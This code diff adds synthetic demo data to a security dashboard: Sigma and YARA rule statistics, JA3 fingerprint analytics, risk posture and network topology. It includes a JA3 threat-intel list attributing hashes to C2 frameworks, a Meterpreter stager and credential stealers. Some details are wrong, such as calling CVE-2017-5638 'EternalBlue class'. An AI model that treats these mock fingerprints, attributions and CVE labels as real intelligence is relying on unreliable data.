@@ -36,6 +36,187 @@ const SIGMA_STATS = D.sigma_rules.map((r: any, i: number) => ({
   last_matched_at: i < 80 ? new Date(Date.now() - i * 3600000).toISOString() : null,
 }));
 
+// Sigma enterprise demo blobs
+const _sigmaRules: any[] = D.sigma_rules ?? [];
+const _sigmaEnabled = _sigmaRules.filter((r: any) => r.enabled).length;
+const _sigmaSevCounts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
+_sigmaRules.forEach((r: any) => { const k = r.severity as keyof typeof _sigmaSevCounts; if (k in _sigmaSevCounts) _sigmaSevCounts[k]++; });
+const _sigmaTactics = [...new Set(_sigmaRules.map((r: any) => r.mitre_tactic).filter(Boolean))];
+const _sigmaTechs   = [...new Set(_sigmaRules.map((r: any) => r.mitre_technique).filter(Boolean))];
+
+const SIGMA_DASHBOARD = {
+  total: _sigmaRules.length,
+  enabled: _sigmaEnabled,
+  disabled: _sigmaRules.length - _sigmaEnabled,
+  severity: _sigmaSevCounts,
+  status: { experimental: Math.floor(_sigmaRules.length * 0.6), stable: Math.floor(_sigmaRules.length * 0.3), testing: Math.floor(_sigmaRules.length * 0.1) },
+  triggered_24h: Math.min(Math.floor(_sigmaRules.length * 0.3), 40),
+  triggered_7d:  Math.min(Math.floor(_sigmaRules.length * 0.6), 80),
+  total_hits_24h: 247,
+  mitre_tactics: _sigmaTactics.length,
+  mitre_techniques: _sigmaTechs.length,
+  top_rules: _sigmaRules.slice(0, 8).map((r: any, i: number) => ({
+    id: r.id, title: r.title, severity: r.severity,
+    hits_7d: Math.max(50 - i * 6, 1), hits_24h: Math.max(12 - i, 0),
+  })),
+  trend: Array.from({ length: 14 }, (_, i) => ({
+    date: new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10),
+    count: 10 + Math.floor(seededRand(i + 100) * 40),
+  })),
+  categories: [
+    { category: 'windows',  total: Math.floor(_sigmaRules.length * 0.4), enabled: Math.floor(_sigmaRules.length * 0.35) },
+    { category: 'linux',    total: Math.floor(_sigmaRules.length * 0.2), enabled: Math.floor(_sigmaRules.length * 0.18) },
+    { category: 'network',  total: Math.floor(_sigmaRules.length * 0.15), enabled: Math.floor(_sigmaRules.length * 0.1) },
+    { category: 'cloud',    total: Math.floor(_sigmaRules.length * 0.1), enabled: Math.floor(_sigmaRules.length * 0.08) },
+    { category: 'unknown',  total: Math.floor(_sigmaRules.length * 0.15), enabled: Math.floor(_sigmaRules.length * 0.1) },
+  ],
+};
+
+const _tacticMap: Record<string, { technique: string; name: string; rules: number; enabled: number }[]> = {};
+_sigmaRules.forEach((r: any) => {
+  if (!r.mitre_tactic || !r.mitre_technique) return;
+  if (!_tacticMap[r.mitre_tactic]) _tacticMap[r.mitre_tactic] = [];
+  const existing = _tacticMap[r.mitre_tactic].find((t: any) => t.technique === r.mitre_technique);
+  if (existing) { existing.rules++; if (r.enabled) existing.enabled++; }
+  else _tacticMap[r.mitre_tactic].push({ technique: r.mitre_technique, name: r.mitre_name || r.mitre_technique, rules: 1, enabled: r.enabled ? 1 : 0 });
+});
+const SIGMA_MITRE_COVERAGE = {
+  coverage: Object.entries(_tacticMap).map(([tactic, techniques]) => ({
+    tactic, techniques, total_rules: techniques.reduce((s: number, t: any) => s + t.rules, 0),
+  })),
+  uncovered: _sigmaRules.filter((r: any) => !r.mitre_tactic).length,
+};
+
+const SIGMA_ANALYTICS = {
+  rules: _sigmaRules.slice(0, 50).map((r: any, i: number) => ({
+    id: r.id, title: r.title, severity: r.severity, mitre_tactic: r.mitre_tactic || '',
+    enabled: r.enabled, hit_count: Math.max(100 - i * 2, 0),
+    hits_24h: Math.max(12 - i, 0), hits_7d: Math.max(50 - i * 1, 0),
+    last_hit: i < 30 ? new Date(Date.now() - i * 7200000).toISOString() : null,
+  })),
+  daily: Array.from({ length: 30 }, (_, i) => ({
+    date: new Date(Date.now() - (29 - i) * 86400000).toISOString().slice(0, 10),
+    hits: 5 + Math.floor(seededRand(i + 200) * 60), rules: 3 + Math.floor(seededRand(i + 300) * 15),
+  })),
+  sev_hits: [
+    { severity: 'critical', hits: 89 }, { severity: 'high', hits: 312 },
+    { severity: 'medium', hits: 541 }, { severity: 'low', hits: 203 },
+  ],
+};
+
+const SIGMA_CATEGORIES = {
+  categories: [
+    { platform: 'windows', category: 'process_creation', total: 45, enabled: 40, hits_7d: 312 },
+    { platform: 'windows', category: 'network_connection', total: 18, enabled: 15, hits_7d: 87 },
+    { platform: 'windows', category: 'registry_event', total: 12, enabled: 10, hits_7d: 43 },
+    { platform: 'linux',   category: 'process_creation', total: 22, enabled: 20, hits_7d: 156 },
+    { platform: 'linux',   category: 'auditd', total: 8, enabled: 7, hits_7d: 29 },
+    { platform: 'network', category: 'general', total: 15, enabled: 12, hits_7d: 201 },
+    { platform: 'cloud',   category: 'aws', total: 10, enabled: 8, hits_7d: 34 },
+    { platform: 'unknown', category: 'general', total: 20, enabled: 14, hits_7d: 0 },
+  ],
+};
+
+const SIGMA_RELATIONSHIPS = {
+  nodes: [
+    ..._sigmaRules.slice(0, 8).map((r: any) => ({ id: `rule_${r.id}`, label: r.title.slice(0, 18), type: 'rule', value: 10 })),
+    { id: 'agent_1', label: 'WIN10-CORP', type: 'agent', value: 8 },
+    { id: 'agent_2', label: 'LINUX-SRV1', type: 'agent', value: 5 },
+    { id: 'agent_3', label: 'DC01', type: 'agent', value: 12 },
+    ..._sigmaTechs.slice(0, 5).map((t: string) => ({ id: `mitre_${t}`, label: t, type: 'mitre', value: 1 })),
+  ],
+  edges: [
+    ..._sigmaRules.slice(0, 8).map((r: any, i: number) => ({ source: `rule_${r.id}`, target: `agent_${(i % 3) + 1}`, weight: 5 - i })),
+    ..._sigmaRules.slice(0, 5).map((r: any, i: number) => ({ source: `rule_${r.id}`, target: `mitre_${_sigmaTechs[i % _sigmaTechs.length]}`, weight: 1 })),
+  ],
+};
+
+// ── YARA enterprise demo blobs ────────────────────────────────────────────
+
+const _yaraRules: any[]   = D.yara_rules   ?? [];
+const _yaraMatches: any[] = D.yara_matches  ?? [];
+const _yaraEnabled = _yaraRules.filter((r: any) => r.enabled !== false).length;
+
+const _yaraSevCounts: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
+_yaraMatches.forEach((m: any) => { const k = m.severity as string; if (k in _yaraSevCounts) _yaraSevCounts[k]++; });
+
+const _yaraTopRules: Record<string, { matches: number; matches_24h: number; severity: string }> = {};
+_yaraMatches.forEach((m: any, i: number) => {
+  if (!_yaraTopRules[m.rule_name]) _yaraTopRules[m.rule_name] = { matches: 0, matches_24h: 0, severity: m.severity ?? 'medium' };
+  _yaraTopRules[m.rule_name].matches++;
+  if (i < 20) _yaraTopRules[m.rule_name].matches_24h++;
+});
+
+const YARA_DASHBOARD = {
+  total:           _yaraRules.length,
+  enabled:         _yaraEnabled,
+  disabled:        _yaraRules.length - _yaraEnabled,
+  matches_today:   Math.min(_yaraMatches.length, 12),
+  matches_week:    _yaraMatches.length,
+  matches_total:   _yaraMatches.length,
+  files_detected:  Math.floor(_yaraMatches.length * 0.8),
+  agents_triggered: [...new Set(_yaraMatches.map((m: any) => m.agent_id))].length,
+  sev_breakdown: Object.entries(_yaraSevCounts).filter(([, c]) => c > 0).map(([severity, count]) => ({ severity, count })),
+  top_rules: Object.entries(_yaraTopRules).sort((a, b) => b[1].matches - a[1].matches).slice(0, 8)
+    .map(([rule_name, v]) => ({ rule_name, ...v })),
+  trend: Array.from({ length: 14 }, (_, i) => ({
+    date:  new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10),
+    count: Math.floor(seededRand(i + 400) * 15),
+  })),
+  recent_matches: _yaraMatches.slice(0, 8).map((m: any) => ({
+    rule_name:  m.rule_name,
+    file_path:  m.file_path,
+    severity:   m.severity,
+    agent_id:   m.agent_id,
+    created_at: m.created_at ?? new Date(Date.now() - Math.floor(seededRand(m.id ?? 1) * 86400000)).toISOString(),
+  })),
+};
+
+const YARA_ANALYTICS = {
+  rules: _yaraRules.slice(0, 50).map((r: any, i: number) => ({
+    rule_name:    r.name,
+    total:        Math.max(30 - i * 2, 0),
+    last_7d:      Math.max(12 - i, 0),
+    last_24h:     Math.max(4 - i, 0),
+    last_match:   i < 20 ? new Date(Date.now() - i * 7200000).toISOString() : null,
+    top_severity: r.rule_content?.includes('critical') ? 'critical' : r.rule_content?.includes('high') ? 'high' : 'medium',
+  })),
+  daily: Array.from({ length: 30 }, (_, i) => ({
+    date:  new Date(Date.now() - (29 - i) * 86400000).toISOString().slice(0, 10),
+    count: Math.floor(seededRand(i + 500) * 12),
+  })),
+  top_agents: D.agents.map((a: any, i: number) => ({
+    agent_id:   a.id,
+    agent_name: a.hostname,
+    matches:    Math.max(20 - i * 5, 0),
+  })).filter((a: any) => a.matches > 0),
+};
+
+const _YARA_FAMILIES = ['ransomware', 'trojan', 'backdoor', 'webshell', 'miner', 'rootkit', 'packer', 'generic'];
+const YARA_CATEGORIES = {
+  categories: _YARA_FAMILIES.map((cat, i) => {
+    const catRules = _yaraRules.filter((_: any, ri: number) => ri % _YARA_FAMILIES.length === i);
+    return {
+      category: cat,
+      total:    Math.max(catRules.length, 1),
+      enabled:  Math.max(catRules.filter((r: any) => r.enabled !== false).length, 1),
+      rules: catRules.map((r: any) => ({ id: r.id, name: r.name, enabled: r.enabled !== false })),
+    };
+  }),
+};
+
+const YARA_RELATIONSHIPS = {
+  nodes: [
+    ..._yaraRules.slice(0, 8).map((r: any) => ({ id: `rule_${r.id}`, label: r.name.slice(0, 18), type: 'rule', value: 6 })),
+    ...D.agents.map((a: any) => ({ id: `agent_${a.id}`, label: a.hostname.slice(0, 14), type: 'agent', value: 8 })),
+    ...['malware_x.exe', 'svchost_fake.exe', 'wscript.exe', 'packed.bin'].map((f, i) => ({ id: `file_${i}`, label: f, type: 'file', value: 4 })),
+  ],
+  edges: [
+    ..._yaraRules.slice(0, 8).map((r: any, i: number) => ({ source: `rule_${r.id}`, target: `agent_${D.agents[i % D.agents.length]?.id ?? 1}`, weight: 5 - i })),
+    ..._yaraMatches.slice(0, 4).map((_: any, i: number) => ({ source: `rule_${_yaraRules[i % _yaraRules.length]?.id ?? 1}`, target: `file_${i % 4}`, weight: 3 })),
+  ],
+};
+
 // FleetAnomalySummary[] — one entry per agent
 const FLEET_SUMMARIES = D.agents.map((a: any, i: number) => ({
   agent_id:    a.id,
@@ -78,6 +259,152 @@ const JA3_NORMALIZED = D.ja3.map((j: any, i: number) => ({
   ...j,
   is_platform: i < 2,
 }));
+
+// ── JA3 Enterprise demo blobs ─────────────────────────────────────────────
+
+const _ja3: any[]    = D.ja3 ?? [];
+const _ja3Alerts     = D.alerts.filter((a: any) => a.mitre_technique === 'T1071.001');
+
+const JA3_DASHBOARD = {
+  total:           _ja3.length,
+  platform_count:  2,
+  tenant_count:    Math.max(_ja3.length - 2, 0),
+  critical_count:  _ja3.filter((j: any) => j.severity === 'critical').length,
+  new_today:       0,
+  alerts_24h:      _ja3Alerts.length,
+  alerts_7d:       _ja3Alerts.length,
+  agents_hit_24h:  [...new Set(_ja3Alerts.map((a: any) => a.agent_id))].length,
+  high_risk_sessions: _ja3Alerts.length,
+  top_fingerprints: _ja3.map((j: any, i: number) => ({
+    hash:        j.hash,
+    threat_name: j.threat_name,
+    severity:    j.severity,
+    source:      j.source,
+    hit_count:   Math.max(20 - i * 5, 0),
+  })),
+  trend: Array.from({ length: 14 }, (_, i) => ({
+    date:  new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10),
+    count: Math.floor(seededRand(i + 700) * 8),
+  })),
+  sev_breakdown: [
+    { severity: 'critical', count: _ja3.filter((j: any) => j.severity === 'critical').length },
+    { severity: 'high',     count: _ja3.filter((j: any) => j.severity === 'high').length },
+    { severity: 'medium',   count: _ja3.filter((j: any) => j.severity === 'medium').length },
+  ].filter(s => s.count > 0),
+};
+
+const JA3_ANALYTICS = {
+  fingerprints: _ja3.map((j: any, i: number) => ({
+    hash:        j.hash,
+    threat_name: j.threat_name,
+    severity:    j.severity,
+    source:      j.source,
+    total:       Math.max(20 - i * 4, 0),
+    last_24h:    Math.max(5 - i, 0),
+    last_7d:     Math.max(12 - i * 2, 0),
+    last_match:  i < 3 ? new Date(Date.now() - i * 7200000).toISOString() : null,
+    agents_hit:  Math.max(2 - i, 0),
+  })),
+  daily: Array.from({ length: 30 }, (_, i) => ({
+    date:  new Date(Date.now() - (29 - i) * 86400000).toISOString().slice(0, 10),
+    count: Math.floor(seededRand(i + 800) * 6),
+  })),
+  top_agents: D.agents.map((a: any, i: number) => ({
+    agent_id:   a.id,
+    hostname:   a.hostname,
+    hits:       Math.max(8 - i * 2, 0),
+  })).filter((a: any) => a.hits > 0),
+};
+
+const JA3_TLS_STATS = {
+  tls_versions: [
+    { version: 'TLSv1.3', count: 1247 },
+    { version: 'TLSv1.2', count: 834 },
+    { version: 'TLSv1.1', count: 12 },
+    { version: 'TLSv1.0', count: 5 },
+  ],
+  ciphers: [
+    { cipher: 'TLS_AES_256_GCM_SHA384',     count: 756,  is_weak: false },
+    { cipher: 'TLS_CHACHA20_POLY1305_SHA256',count: 491,  is_weak: false },
+    { cipher: 'TLS_AES_128_GCM_SHA256',     count: 312,  is_weak: false },
+    { cipher: 'TLS_RSA_WITH_3DES_EDE_CBC_SHA',count: 8,  is_weak: true  },
+    { cipher: 'TLS_RSA_WITH_RC4_128_SHA',   count: 3,    is_weak: true  },
+  ],
+  self_signed:   4,
+  expired_certs: 2,
+  invalid_certs: 1,
+  unique_ja3:    _ja3.length,
+  unique_ja3s:   Math.max(_ja3.length - 1, 0),
+};
+
+const JA3_BEHAVIORAL = {
+  beaconing: _ja3Alerts.length > 0 ? [
+    { agent_id: D.agents[0]?.id ?? 1, hostname: D.agents[0]?.hostname ?? 'web-prod-01',
+      alert_count: 12, first_seen: new Date(Date.now() - 3600000 * 6).toISOString(),
+      last_seen: new Date(Date.now() - 1800000).toISOString(), rule_name: 'Malicious TLS Fingerprint: Cobalt Strike Default' },
+  ] : [],
+  rare: _ja3.filter((_: any, i: number) => i >= 2).map((j: any) => ({
+    hash: j.hash, threat_name: j.threat_name, severity: j.severity, hit_count: 0,
+  })),
+  new: [],
+};
+
+const JA3_THREAT_INTEL = {
+  malware_families: [
+    { family: 'Cobalt Strike', confidence: 95, hash: 'a0e9f5d64349fb13191bc781f81f42e1',
+      evidence: 'Default Malleable C2 profile with 769 cipher suite; widely documented in threat intel', mitre: 'T1071.001',
+      actor: 'Various APT groups (Lazarus, APT41, FIN7)', reports: ['CrowdStrike CS-C2 Intel', 'Recorded Future'], category: 'C2 Framework', in_blocklist: true },
+    { family: 'Metasploit', confidence: 90, hash: '6734f37431670b3ab4292b8f60f29984',
+      evidence: 'Metasploit Meterpreter HTTPS stager — unique cipher ordering', mitre: 'T1059.001',
+      actor: 'Multiple threat actors', reports: ['Salesforce JA3 Research', 'Sslbl.abuse.ch'], category: 'Exploitation Framework', in_blocklist: true },
+    { family: 'Sliver C2', confidence: 80, hash: '473cd7cb9faa642487833865d516e578',
+      evidence: 'Sliver C2 framework default HTTPS beacon fingerprint', mitre: 'T1071.001',
+      actor: 'State-sponsored actors', reports: ['BishopFox Sliver Analysis'], category: 'C2 Framework', in_blocklist: false },
+    { family: 'PowerShell Empire', confidence: 75, hash: 'a17b458f85ff9b1e2c9f7c30bc44e90b',
+      evidence: 'Python requests library fingerprint in specific Empire config', mitre: 'T1059.001',
+      actor: 'FIN10, APT28', reports: ['BC-Security Empire Docs'], category: 'C2 Framework', in_blocklist: false },
+    { family: 'RedLine Stealer', confidence: 85, hash: '0bab3f08a8a8a8f1815a42a1f4ff2a1a',
+      evidence: 'RedLine infostealer TLS via WinHTTP characteristic cipher ordering', mitre: 'T1041',
+      actor: 'Underground criminals', reports: ['CISA AA22-264A'], category: 'Infostealer', in_blocklist: false },
+    { family: 'TrickBot', confidence: 70, hash: '72a589da586844d7f0818ce684948eea',
+      evidence: 'TrickBot banking trojan HTTPS C2 using modified OpenSSL fingerprint', mitre: 'T1071.001',
+      actor: 'Wizard Spider', reports: ['Palo Alto Unit 42'], category: 'Banking Trojan', in_blocklist: false },
+  ],
+  recent_hits: _ja3Alerts.slice(0, 8).map((a: any) => {
+    const ag = D.agents.find((ag: any) => ag.id === a.agent_id);
+    return { rule_name: a.rule_name, severity: a.severity, created_at: a.created_at, hostname: ag?.hostname ?? `Agent #${a.agent_id}` };
+  }),
+};
+
+const JA3_RELATIONSHIPS = {
+  nodes: [
+    ..._ja3.slice(0, 4).map((j: any) => ({ id: 'ja3_' + j.hash.slice(0, 8), label: j.threat_name.slice(0, 18), type: 'ja3', value: j.severity === 'critical' ? 12 : 6 })),
+    ...D.agents.map((a: any) => ({ id: `agent_${a.id}`, label: a.hostname, type: 'agent', value: 6 })),
+    { id: 'ip_185_220_101', label: '185.220.101.47', type: 'ip', value: 8 },
+    { id: 'ip_45_33_32',    label: '45.33.32.156',  type: 'ip', value: 4 },
+  ],
+  edges: [
+    ..._ja3.slice(0, 4).map((j: any, i: number) => ({ source: `agent_${D.agents[i % D.agents.length]?.id ?? 1}`, target: 'ja3_' + j.hash.slice(0, 8), weight: 4 - i })),
+    { source: `agent_${D.agents[0]?.id ?? 1}`, target: 'ip_185_220_101', weight: 5 },
+    { source: `agent_${D.agents[1]?.id ?? 2}`, target: 'ip_45_33_32',    weight: 2 },
+  ],
+};
+
+const JA3_TIMELINE = {
+  fingerprints: _ja3.map((j: any, i: number) => ({
+    hash:          j.hash,
+    threat_name:   j.threat_name,
+    severity:      j.severity,
+    first_added:   j.created_at ?? new Date(Date.now() - 86400000 * 30).toISOString(),
+    first_match:   i < 2 ? new Date(Date.now() - 86400000 * 7).toISOString() : null,
+    last_match:    i < 2 ? new Date(Date.now() - 3600000).toISOString() : null,
+    total_matches: Math.max(20 - i * 5, 0),
+  })),
+  daily: Array.from({ length: 30 }, (_, i) => ({
+    date:  new Date(Date.now() - (29 - i) * 86400000).toISOString().slice(0, 10),
+    count: Math.floor(seededRand(i + 900) * 6),
+  })),
+};
 
 // Correlation rules mapped to the interface the page expects
 const CORRELATION_RULES_NORMALIZED = D.correlation_rules.map((r: any) => ({
@@ -126,20 +453,135 @@ const VULN_QUEUE_ITEMS = D.vulnerabilities.map((v: any, i: number) => {
 // Risk posture with asset_scores
 function riskPostureSnap() {
   const base = D.risk_posture[0] ?? {};
+
   const asset_scores = D.agents.map((a: any, i: number) => ({
     asset_id:    a.id,
     hostname:    a.hostname,
     score:       [82, 67, 44, 31][i] ?? 50,
     top_reason:  ['C2 beacon detected', 'Lateral movement', 'Vuln exposure', 'Low risk'][i] ?? 'Normal activity',
     criticality: ['critical', 'high', 'medium', 'low'][i] ?? 'medium',
+    os:          a.os ?? 'linux',
   }));
+
+  // Internet exposure — agents with non-RFC1918 IPs or known exposed flag
+  const exposedHosts = D.agents
+    .filter((a: any) => a.ip_address && !a.ip_address.startsWith('10.') && !a.ip_address.startsWith('192.168.') && !a.ip_address.startsWith('172.'))
+    .map((a: any) => ({ hostname: a.hostname, ip: a.ip_address, port_count: 3 }));
+  // Add demo internet-facing hosts
+  const internet_exposure = {
+    exposed_count: exposedHosts.length + 2,
+    exposed_hosts: [
+      { hostname: 'web-prod-01',  ip: '203.0.113.12', open_ports: [80, 443, 8080], services: ['nginx/1.18', 'Node/18'] },
+      { hostname: 'vpn-gw-01',   ip: '203.0.113.5',  open_ports: [1194, 443],     services: ['OpenVPN/2.5', 'stunnel'] },
+      ...exposedHosts.map((h: any) => ({ hostname: h.hostname, ip: h.ip, open_ports: [22, 443], services: ['sshd'] })),
+    ],
+  };
+
+  // Missing patches — from vulnerabilities
+  const vulns = D.vulnerabilities ?? [];
+  const missingPatches = {
+    critical: vulns.filter((v: any) => v.cvss_score >= 9.0  && !v.patched_at).length,
+    high:     vulns.filter((v: any) => v.cvss_score >= 7.0  && v.cvss_score < 9.0 && !v.patched_at).length,
+    medium:   vulns.filter((v: any) => v.cvss_score >= 4.0  && v.cvss_score < 7.0 && !v.patched_at).length,
+    total:    vulns.filter((v: any) => !v.patched_at).length,
+    overdue:  vulns.filter((v: any) => !v.patched_at && v.cvss_score >= 7.0).length,
+  };
+
+  // Unsupported OS
+  const unsupported_os = [
+    { hostname: 'win-workstation-05', os: 'Windows 7 SP1',    eol: '2020-01-14', agent_id: 3 },
+    { hostname: 'legacy-db-03',       os: 'CentOS 6.10',      eol: '2020-11-30', agent_id: null },
+    { hostname: 'print-srv-01',       os: 'Windows Server 2008 R2', eol: '2020-01-14', agent_id: null },
+  ];
+
+  // Misconfigurations — derived from alerts + demo
+  const misconfigs = [
+    { id: 1, title: 'SMB Signing Disabled',           severity: 'high',   asset: 'win-workstation-05', category: 'network' },
+    { id: 2, title: 'RDP Exposed to Internet',         severity: 'critical',asset: 'web-prod-01',       category: 'network' },
+    { id: 3, title: 'SSH Root Login Enabled',          severity: 'high',   asset: 'db-server-02',       category: 'auth' },
+    { id: 4, title: 'Weak Password Policy (< 8 chars)',severity: 'medium', asset: 'AD Domain',          category: 'identity' },
+    { id: 5, title: 'Admin Share (C$) Accessible',    severity: 'high',   asset: 'win-workstation-05', category: 'network' },
+    { id: 6, title: 'Antivirus Definition Outdated',  severity: 'medium', asset: 'android-mobile-01',  category: 'endpoint' },
+    { id: 7, title: 'Docker Socket Mounted in Container', severity: 'critical', asset: 'k8s-node-01',  category: 'container' },
+  ];
+
+  // User risk — from UEBA
+  const user_risk = (D.ueba_users ?? [])
+    .slice(0, 8)
+    .map((u: any) => ({
+      username:     u.username,
+      risk_score:   u.risk_score,
+      flags:        u.flags ?? [],
+      failed_logins:u.failed_logins ?? 0,
+      off_hours:    u.off_hours_events ?? 0,
+      last_seen_ip: u.last_seen_ip ?? '—',
+    }));
+
+  // Department risk
+  const department_risk = [
+    { name: 'Engineering',  score: 68, users: 24, assets: 12, top_issue: 'Unpatched CVEs' },
+    { name: 'Finance',      score: 45, users: 8,  assets: 6,  top_issue: 'Insider threat indicators' },
+    { name: 'IT Ops',       score: 82, users: 6,  assets: 18, top_issue: 'C2 beacon on endpoint' },
+    { name: 'Sales',        score: 31, users: 35, assets: 15, top_issue: 'Phishing susceptibility' },
+    { name: 'HR',           score: 22, users: 12, assets: 4,  top_issue: 'Weak passwords' },
+    { name: 'Executive',    score: 55, users: 5,  assets: 5,  top_issue: 'Impossible travel' },
+  ];
+
+  // High-risk identities — from ITDR findings
+  const high_risk_identities = (D.itdr_findings ?? [])
+    .filter((f: any) => f.status === 'open')
+    .slice(0, 6)
+    .map((f: any) => ({
+      identity:       f.identity,
+      identity_type:  f.identity_type,
+      finding_type:   f.finding_type,
+      severity:       f.severity,
+      mitre_technique:f.mitre_technique,
+      description:    f.description,
+    }));
+
+  // High-risk applications
+  const high_risk_apps = [
+    { name: 'TeamViewer',      version: '14.7',  risk: 'high',   reason: 'Remote access tool — abused by threat actors', assets: 2 },
+    { name: 'WinRAR',          version: '5.70',  risk: 'critical',reason: 'CVE-2023-38831 unpatched (EPSS 0.97)',        assets: 3 },
+    { name: 'OpenSSL',         version: '1.0.2k',risk: 'critical',reason: 'EOL — Heartbleed-era version still in use',   assets: 2 },
+    { name: 'Apache Struts',   version: '2.3.34',risk: 'high',   reason: 'CVE-2017-5638 (EternalBlue class RCE)',       assets: 1 },
+    { name: 'Log4j',           version: '2.14.1',risk: 'critical',reason: 'Log4Shell CVE-2021-44228 — has_kev: true',   assets: 1 },
+  ];
+
+  // Trend — 30 days, adding breakdown per score type
+  const now = Date.now();
+  const trend = Array.from({ length: 30 }, (_, i) => {
+    const d = new Date(now - (29 - i) * 86400000);
+    const base_score = 30 + Math.round(Math.sin(i * 0.4) * 12 + i * 0.5);
+    return {
+      date:        d.toISOString().slice(0, 10),
+      score:       Math.min(95, base_score + 10),
+      vuln_score:  Math.min(40, Math.round(20 + Math.sin(i * 0.3) * 8)),
+      ueba_score:  Math.min(20, Math.round(8 + Math.cos(i * 0.5) * 5)),
+      alert_score: Math.min(30, Math.round(15 + Math.sin(i * 0.6) * 8)),
+      ioc_score:   Math.min(20, Math.round(5 + Math.cos(i * 0.4) * 4)),
+    };
+  });
+
   return {
-    score:        base.score        ?? 42,
-    vuln_score:   base.vuln_score   ?? 35,
-    ueba_score:   base.ueba_score   ?? 60,
-    alert_score:  base.alert_score  ?? 55,
-    ioc_score:    base.ioc_score    ?? 20,
+    score:                base.score       ?? 62,
+    vuln_score:           base.vuln_score  ?? 35,
+    ueba_score:           base.ueba_score  ?? 60,
+    alert_score:          base.alert_score ?? 55,
+    ioc_score:            base.ioc_score   ?? 20,
+    snoozed_alert_count:  2,
+    snapshot_at:          new Date().toISOString(),
     asset_scores,
+    internet_exposure,
+    missing_patches:      missingPatches,
+    unsupported_os,
+    misconfigurations:    misconfigs,
+    user_risk,
+    department_risk,
+    high_risk_identities,
+    high_risk_apps,
+    trend,
   };
 }
 
@@ -270,56 +712,169 @@ const NETWORK_MAP = (() => {
     };
   });
 
+  // Infrastructure topology nodes
+  const infraNodes = [
+    { id: 'infra-fw-01',  type: 'firewall'  as const, hostname: 'pf-fw-01',   ip: '10.0.0.1',  zone: 'dmz'      as const, risk_score: 25, risk_level: 'low',    alert_count: 0, is_ioc: false, status: 'online' as const, role: 'Perimeter Firewall', vlan: 'VLAN-1'  },
+    { id: 'infra-rt-01',  type: 'router'    as const, hostname: 'core-rt-01', ip: '10.0.0.2',  zone: 'internal' as const, risk_score: 15, risk_level: 'low',    alert_count: 0, is_ioc: false, status: 'online' as const, role: 'Core Router',        vlan: 'VLAN-1'  },
+    { id: 'infra-sw-01',  type: 'switch'    as const, hostname: 'acc-sw-01',  ip: '10.0.0.3',  zone: 'internal' as const, risk_score: 10, risk_level: 'low',    alert_count: 0, is_ioc: false, status: 'online' as const, role: 'Access Switch',      vlan: 'VLAN-10' },
+    { id: 'infra-vpn-01', type: 'vpn'       as const, hostname: 'vpn-gw-01',  ip: '10.0.0.5',  zone: 'dmz'      as const, risk_score: 30, risk_level: 'medium', alert_count: 0, is_ioc: false, status: 'online' as const, role: 'VPN Gateway',        vlan: 'VLAN-1'  },
+    { id: 'infra-ap-01',  type: 'wireless'  as const, hostname: 'ap-floor-1', ip: '10.0.1.1',  zone: 'internal' as const, risk_score: 20, risk_level: 'low',    alert_count: 0, is_ioc: false, status: 'online' as const, role: 'Wireless AP',        vlan: 'VLAN-20' },
+    { id: 'infra-cloud',  type: 'cloud'     as const, hostname: 'aws-sg-web', ip: '52.2.3.4',  zone: 'external' as const, risk_score: 0,  risk_level: 'unknown',alert_count: 0, is_ioc: false, status: 'online' as const, role: 'AWS Security Group', vlan: ''        },
+    { id: 'infra-wan',    type: 'wan'       as const, hostname: 'wan-uplink',  ip: '203.0.0.1', zone: 'external' as const, risk_score: 0,  risk_level: 'unknown',alert_count: 0, is_ioc: false, status: 'online' as const, role: 'WAN Uplink (ISP)',   vlan: ''        },
+  ];
+
+  const infraEdges = [
+    { source: 'infra-wan',    target: 'infra-fw-01',                    protocol: 'TCP', port: '443', service: 'HTTPS',   port_sensitivity: 'neutral' as const, process: 'pppoe',          count: 1,  last_seen: new Date().toISOString(), edge_type: 'external' as const, port_note: '' },
+    { source: 'infra-fw-01',  target: 'infra-rt-01',                    protocol: 'TCP', port: '80',  service: 'HTTP',    port_sensitivity: 'safe'    as const, process: 'pf',             count: 5,  last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
+    { source: 'infra-fw-01',  target: 'infra-vpn-01',                   protocol: 'UDP', port: '1194',service: 'OpenVPN', port_sensitivity: 'neutral' as const, process: 'openvpn',        count: 2,  last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
+    { source: 'infra-rt-01',  target: 'infra-sw-01',                    protocol: 'TCP', port: '179', service: 'BGP',     port_sensitivity: 'sensitive' as const, process: 'ospf',         count: 3,  last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
+    { source: 'infra-sw-01',  target: String(agentNodes[0]?.id ?? '1'), protocol: 'TCP', port: '80',  service: 'HTTP',    port_sensitivity: 'safe'    as const, process: 'spanning-tree',  count: 8,  last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
+    { source: 'infra-sw-01',  target: String(agentNodes[1]?.id ?? '2'), protocol: 'TCP', port: '80',  service: 'HTTP',    port_sensitivity: 'safe'    as const, process: 'spanning-tree',  count: 6,  last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
+    { source: 'infra-cloud',  target: String(agentNodes[0]?.id ?? '1'), protocol: 'TCP', port: '443', service: 'HTTPS',   port_sensitivity: 'safe'    as const, process: 'aws-agent',      count: 4,  last_seen: new Date().toISOString(), edge_type: 'external' as const, port_note: '' },
+    { source: 'infra-ap-01',  target: String(agentNodes[2]?.id ?? '3'), protocol: 'UDP', port: '53',  service: 'DNS',     port_sensitivity: 'neutral' as const, process: 'hostapd',        count: 12, last_seen: new Date().toISOString(), edge_type: 'internal' as const, port_note: '' },
+  ];
+
+  const allNodes = [...nodes, ...infraNodes];
+  const allEdges = [...edges, ...infraEdges];
+
   const onlineAgents = D.agents.filter((a: any) => a.status === 'online').length;
   const alertingIds  = new Set(D.alerts.map((al: any) => String(al.agent_id)));
   const summary = {
-    total_agents:   D.agents.length,
-    online_agents:  onlineAgents,
-    external_ips:   extNodes.length,
-    total_edges:    edges.length,
-    ioc_hits:       0,
-    alerting_nodes: alertingIds.size,
+    total_agents:    D.agents.length,
+    online_agents:   onlineAgents,
+    external_ips:    extNodes.length,
+    total_edges:     allEdges.length,
+    ioc_hits:        0,
+    alerting_nodes:  alertingIds.size,
+    infra_devices:   infraNodes.length,
   };
